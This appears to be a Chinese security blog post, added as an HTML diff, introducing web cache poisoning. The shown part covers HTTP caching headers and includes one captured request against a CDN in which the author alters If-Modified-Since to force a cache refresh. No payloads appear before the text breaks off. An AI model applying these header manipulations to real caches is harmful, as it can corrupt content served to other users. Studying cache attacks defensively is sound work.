@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
+  <meta name="baidu-site-verification" content="code-NObBqxefR1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="上善若水。水善利万物而不争，处众人之所恶，故几于道。  web cache poisoning(web缓存投毒攻击) 一直是一种理论上的漏洞，James Kettle的研究将理论带入到实践。web缓存投毒攻击因James Kettle在black hat 2018 和black hat 2020关于缓存投毒的演讲而知名 本篇文章结合了James Kettle及其他人员关于 web cache p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web缓存投毒攻击全解">
+<meta property="og:url" content="http://example.com/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E5%85%A8%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Vinci">
+<meta property="og:description" content="上善若水。水善利万物而不争，处众人之所恶，故几于道。  web cache poisoning(web缓存投毒攻击) 一直是一种理论上的漏洞，James Kettle的研究将理论带入到实践。web缓存投毒攻击因James Kettle在black hat 2018 和black hat 2020关于缓存投毒的演讲而知名 本篇文章结合了James Kettle及其他人员关于 web cache p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210109150534753.png">
+<meta property="og:image" content="http://example.com/images/pics/web缓存投毒攻击/image-20210218101505225.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222164524255.png">
+<meta property="og:image" content="http://example.com/images/pics/web缓存投毒攻击/image-20210218131218339.png">
+<meta property="og:image" content="http://example.com/images/pics/web缓存投毒攻击/image-20210218131321294.png">
+<meta property="og:image" content="http://example.com/images/pics/web缓存投毒攻击/image-20210218094112468.png">
+<meta property="og:image" content="http://example.com/images/pics/web缓存投毒攻击/image-20210218134240191.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210106201009322.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224135625306.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224143048453.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224145431373.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224152322209.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224163837785.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224090312085.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224091125193.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224091533071.png">
+<meta property="og:image" content="http://example.com/images/pics/web缓存投毒攻击/image-20210126145541074.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126150819389.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126154246309.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126154627672.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126155448168.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126160158690.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126160316805.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128152651406.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128154155722.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128154012345.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130110131055.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130110228316.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130170904429.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201090054053.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202151540464.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202151922285.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202153512601.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202163616096.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201141404173.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201141629661.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202164838827.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202165248679.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222141653763.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222142043129.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222142632400.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222145309155.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222144410773.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204100506511.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204100805897.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204105734286.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204110117141.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210204110226548.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207111457635.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207111614903.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207131145356.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210207131104220.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216090500297.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216090542129.png">
+<meta property="og:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210216091300459.png">
+<meta property="article:published_time" content="2021-12-28T12:03:24.000Z">
+<meta property="article:modified_time" content="2022-06-10T12:29:43.815Z">
+<meta property="article:author" content="Vinci">
+<meta property="article:tag" content="web漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210109150534753.png">
+
+<link rel="canonical" href="http://example.com/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E5%85%A8%E8%A7%A3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>web缓存投毒攻击全解 | Vinci</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Vinci</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Nothing</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E5%85%A8%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="Vinci">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Vinci">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web缓存投毒攻击全解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-28 20:03:24" itemprop="dateCreated datePublished" datetime="2021-12-28T20:03:24+08:00">2021-12-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-10 20:29:43" itemprop="dateModified" datetime="2022-06-10T20:29:43+08:00">2022-06-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>上善若水。水善利万物而不争，处众人之所恶，故几于道。</p>
+</blockquote>
+<p>web cache poisoning(web缓存投毒攻击) 一直是一种理论上的漏洞，James Kettle的研究将理论带入到实践。web缓存投毒攻击因James Kettle在black hat 2018 和black hat 2020关于缓存投毒的演讲而知名</p>
+<p>本篇文章结合了James Kettle及其他人员关于 web cache poisoning 的研究成果，并结合案例及靶机进行讲解。</p>
+<span id="more"></span>
+
+<h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a>1. 基础概念</h2><h3 id="1-1-web-缓存"><a href="#1-1-web-缓存" class="headerlink" title="1.1 web 缓存"></a>1.1 web 缓存</h3><p>web缓存在网络世界中无处不在，处于client 和 server之间，保存着某些响应的副本，当下次请求同一个资源的时候，缓存会将响应直接返回给client，而不用再去请求server。</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210109150534753.png" alt="image-20210109150534753"></p>
+<p>缓存存在的目的就是提升网页加载速度、减少server的负载。有些公司可能会使用类似Varnish的软件来建自己的缓存，但更多的会选择使用其他厂商的CDN服务，比如Cloudflare。随着CDN的流行，许多web应用程序或框架已经内部集成了缓存的功能，比如Drupal。除了web缓存外，还有其他类型的缓存，比如浏览器缓存、DNS缓存等，但这些不在本次讨论的范围中。</p>
+<h3 id="1-2-不同种类的缓存"><a href="#1-2-不同种类的缓存" class="headerlink" title="1.2 不同种类的缓存"></a>1.2 不同种类的缓存</h3><p><strong>1. 数据库缓存</strong></p>
+<p>有的web应用，数据表繁多，如果频繁进行数据库查询，很容易导致数据库不堪重负。为了提高查询的性能，会将查询后的数据放到内存中进行缓存，下次查询时，直接从内存缓存返回，提高响应效率，常用的缓存方案有memcached、redis等。</p>
+<p><strong>2. 服务端缓存（本文的攻击目标就是服务端缓存）</strong></p>
+<p>服务端缓存包含代理服务器缓存和CDN缓存，也就是我们的攻击目标，如果是浏览器缓存攻击不在本文讨论范围之内</p>
+<p>1）代理服务器缓存</p>
+<p>代理服务器是浏览器和源服务器的中间服务器，浏览器先向这个中间服务器发起Web请求，经过处理后（比如权限验证，缓存匹配等），再将请求转发到源服务器。</p>
+<p>2）CDN缓存</p>
+<p>CDN(Content delivery networks)缓存，也叫网关缓存、反向代理缓存。浏览器先向CDN网关发起Web请求，网关服务器后面对应着一台或多台负载均衡服务器，会根据它们的负载请求，动态将请求转发到合适的服务器上。</p>
+<p><strong>3. 浏览器端缓存</strong></p>
+<p>浏览器缓存(Browser Caching) 是浏览器端保存数据用于快速读取或避免重复资源请求的优化机制，有效的缓存使用可以避免重复的网络请求和浏览器快速地读取本地数据，整体上加速网页展示给用户。</p>
+<p><strong>4. Web应用层缓存</strong></p>
+<p>应用层缓存指的是从代码层面上，通过代码逻辑和缓存策略，实现对数据，页面，图片等资源的缓存，可以根据实际情况选择将数据存在文件系统或者内存中，减少数据库查询或者读写瓶颈，提高响应效率。</p>
+<p>web应用缓存。</p>
+<h3 id="1-3-HTTP协议如何控制web缓存"><a href="#1-3-HTTP协议如何控制web缓存" class="headerlink" title="1.3 HTTP协议如何控制web缓存"></a>1.3 HTTP协议如何控制web缓存</h3><p>如果是服务端代理的形式，发起http请求时候，会遇到三种情况</p>
+<ul>
+<li><p>无缓存标识/无缓存结果，直接请求服务器</p>
+<img src="../images/pics/web缓存投毒攻击/image-20210218101505225.png" alt="image-20210218101505225" style="zoom:50%;" /></li>
+<li><p>存在缓存结果和缓存标识，但结果失效，使用协商缓存。有两种情况</p>
+<ol>
+<li><p>协商后内容没有更新</p>
+<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210222164524255.png" alt="image-20210222164524255"></p>
+</li>
+<li><p>协商后内容更新</p>
+<img src="../images/pics/web缓存投毒攻击/image-20210218131218339.png" alt="image-20210218131218339" style="zoom:50%;" /></li>
+</ol>
+</li>
+<li><p>存在该缓存结果和缓存标识，且该结果尚未失效，强制缓存生效，直接返回该结果</p>
+</li>
+</ul>
+<p>​       <img src="../images/pics/web缓存投毒攻击/image-20210218131321294.png" alt="image-20210218131321294" style="zoom:50%;" /></p>
+<p><strong>http协议控制缓存在两种方式，分为强制缓存和协商缓存。</strong></p>
+<h4 id="1-强制缓存"><a href="#1-强制缓存" class="headerlink" title="1. 强制缓存"></a>1. 强制缓存</h4><p>强制缓存由expires和cache-control控制，expire是HTTP1.0控制缓存的字段，而cache-control是http1.1控制缓存的字段，当两个同时存在时，cache-control优先</p>
+<p><strong>Expires：</strong></p>
+<p>Expires的值为缓存到期时间，即再次发起该请求时，如果客户端的时间小于Expires 的值时，直接使用缓存结果。Expires判断是否使用缓存的依据是比对客户端与服务端的相对时间，这就存在一个问题，如果客户端自己修改了一个时间，那么服务端定义的过期时间就毫无意义。所以后面HTTP1.1的cache-control使用了绝对时间来解决这个问题。</p>
+<p><strong>Cache-Control</strong></p>
+<p>在 <code>HTTP/1.1</code> 中，<code>Cache-Control</code> 是最重要的规则，主要用于控制网页缓存，主要取值为：</p>
+<ul>
+<li><code>public</code>：所有内容都将被缓存（客户端和代理服务器都可缓存）。</li>
+<li><code>private</code>：所有内容只有客户端可以缓存，<code>Cache-Control</code> 的默认取值。</li>
+<li><code>no-cache</code>：客户端缓存内容，但是是否使用缓存则需要经过协商缓存来验证决定。</li>
+<li><code>no-store</code>：所有内容都不会被缓存。</li>
+<li><code> max-age=xxx (xxx is numeric)</code>：缓存内容将在 <code>xxx</code> 秒后失效。</li>
+<li><code>must-revalidate</code>: 使用一个过期资源需要和服务端协商</li>
+</ul>
+<p>如下图是某个请求的返回包内容里面有，max-age和expires同时存在，这种情况使用max-age。</p>
+ <img src="../images/pics/web缓存投毒攻击/image-20210218094112468.png" alt="image-20210218094112468" style="zoom:50%;" />
+
+
+
+<h4 id="2-协商缓存"><a href="#2-协商缓存" class="headerlink" title="2. 协商缓存"></a>2. 协商缓存</h4><p><strong>Last-Modified/If-Modified-Since</strong></p>
+<p>1） Last-Modified</p>
+<p>标示这个资源的最后修改时间，web服务器在响应请求时，告诉浏览器资源的最后修改时间。</p>
+<p>2）If-Modified-Since</p>
+<p>当资源过期时（使用cache-control标识的max-age)，发现资源具有Last-Modified声明，则再次向web服务器请求时带上头if-Modified-Since标识，与被请求资源的最后修改时间进行比对，若最后修改时间较新，说明资源被改动过，则响应整片资源内容（写在响应消息包体内），HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省带宽)，告知浏览器继续使用所保存的cache。</p>
+<p>我们看一个真实的例子，有一个请求如下</p>
+<pre>GET /synthesislink/5651.html HTTP/1.1
+Host: evt.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+Cookie: _hc.v=3bb63beb-3ffc-8a6e-2582-88889c8cf324.1612693648; _lxsdk_cuid=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8; _lxsdk=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8
+Upgrade-Insecure-Requests: 1
+<font color="red">If-Modified-Since: Tue, 19 Mar 2019 23:59:20 GMT</font>
+If-None-Match: "b14f1aaaae22302e7ab07e44a2990ac9"</pre>
+
+
+<p>响应为：</p>
+<pre>HTTP/1.1 <font color="red">304 Not Modified</font>
+Server: NWS_TCloud_S2
+Connection: close
+Date: Mon, 22 Feb 2021 08:29:54 GMT
+Cache-Control: max-age=300
+Expires: Mon, 22 Feb 2021 08:34:54 GMT
+Content-Type: text/html;charset=utf-8
+Content-Length: 0
+X-NWS-LOG-UUID: 1089614981990302347 9fc91eb65c4db73a1ff8259ab718718d
+X-Via: DIANXIN-JIANGSU_31(304:refresh_hit);DIANXIN-JIANGSU_30(304:ims_hit)
+X-Daa-Tunnel: hop_count=1</pre>
+
+
+<p>观察响应，X-NWS-LOG-UUID是腾讯的CDN节点（<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000006673084">各厂商CDN节点</a>），并且有过期时间<code>Expires: Mon, 22 Feb 2021 08:34:54 GMT</code> 。由这些信息可知，这是一个CND web缓存。观察请求，<code>If-Modified-Since: Tue, 19 Mar 2019 23:59:20 GMT</code>还是2019年的。说明Last-Modified是一个很早的时间，只有If-Modified-Since比Last-Modified时间早才会返回304，所以我们修改一个更早的时间，</p>
+<pre>GET /synthesislink/5651.html HTTP/1.1
+Host: evt.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+Cookie: _hc.v=3bb63beb-3ffc-8a6e-2582-88889c8cf324.1612693648; _lxsdk_cuid=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8; _lxsdk=177b98e84b1c8-01596ea0d5b2a-44596b-13c680-177b98e84b1c8
+Upgrade-Insecure-Requests: 1
+<font color="red">If-Modified-Since: Tue, 19 Mar 2021 23:59:20 GMT</font>
+If-None-Match: "b14f1aaaae22302e7ab07e44a2990ac9"</pre>
+
+
+
+<pre>HTTP/1.1 200 OK
+Server: NWS_TCloud_static_msoc2
+Connection: close
+Date: Mon, 22 Feb 2021 08:46:54 GMT
+Cache-Control: max-age=300
+Expires: Mon, 22 Feb 2021 08:51:54 GMT
+<font color="red">Last-Modified: Tue, 19 Mar 2019 23:59:20 GMT</font>
+Content-Type: text/html;charset=utf-8
+Content-Length: 20774
+X-NWS-UUID-VERIFY: 29a5326de1ddd86a7ec8ed63875a0b94
+X-NWS-LOG-UUID: 9138859087622259624 5476affaca7698add4248c29c918eb79
+X-Cache-Lookup: Hit From Disktank3
+Keep-Alive: timeout=5
+Accept-Ranges: bytes
+ETag: "b14f1aaaae22302e7ab07e44a2990ac9"
+X-Amz-Id-2: adee119763fb198799edc98469117b30
+X-Amz-Request-Id: 1613955595686967
+X-Mss-Trace-Id: 5209824156916383142
+X-Route-Trace-Id: 5293343060162248102
+x-amz-storage-class: STANDARD
+Access-Control-Allow-Origin: *
+X-Daa-Tunnel: hop_count=3
+X-Cache-Lookup: Hit From Inner Cluster
+X-Via: DIANXIN-SHANDONG_144(200:miss);DIANXIN-SHANDONG_166(200:refresh_miss)
+X-Cache-Lookup: Hit From Upstream
+X-Cache-Lookup: Hit From Inner Cluster</pre>
+
+
+
+
+<p>观察上面两个请求包，可以知道通过修改<code>If-Modified-Since</code>刷新了缓存，在响应中也出现了时间Last-Modified的值为2019年的日期，印证了我们的猜想。这个例子也说明通过Last-Modified/If-Modified-Since控制缓存是没有什么意义的，可以对其篡改。</p>
+<p><strong>Etag/If-None-Match</strong></p>
+<p>Etag/If-None-Match也要配合Cache-Control使用。</p>
+<p>1）etag: </p>
+<p>web服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器决定）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。</p>
+<p>2）If-None-Match：</p>
+<p>当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。</p>
+<p><strong>4. 既生Last-Modified何生Etag</strong></p>
+<p>既然使用Last-Modified能够知道资源是否足够新，为什么还需要Etag（实体标识）呢？主要解决如下几个问题。</p>
